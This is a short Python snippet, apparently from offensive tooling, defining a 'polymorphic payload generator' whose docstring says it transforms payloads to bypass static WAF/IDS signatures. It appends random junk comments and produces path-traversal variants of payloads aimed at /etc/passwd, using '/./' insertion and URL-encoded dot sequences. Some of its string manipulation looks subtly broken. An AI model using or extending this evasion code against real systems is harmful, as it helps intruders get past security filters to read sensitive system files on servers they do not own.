import random
import string

def polymorphic_payload_generator(base_payload: str) -> str:
    """Transform payloads to bypass static WAF/IDS signatures."""
    # Simple example: encoding and adding random junk comments
    junk = f"/* {''.join(random.choices(string.ascii_letters, k=8))} */"
    if "/etc/passwd" in base_payload:
        # Alternative traversal patterns
        patterns = [
            base_payload,
            base_payload.replace("/", "/./"),
            base_payload.replace("/", "/%2e%2e/").replace("..%2e%2e", ".."),
        ]
        return random.choice(patterns) + junk
    return base_payload + junk
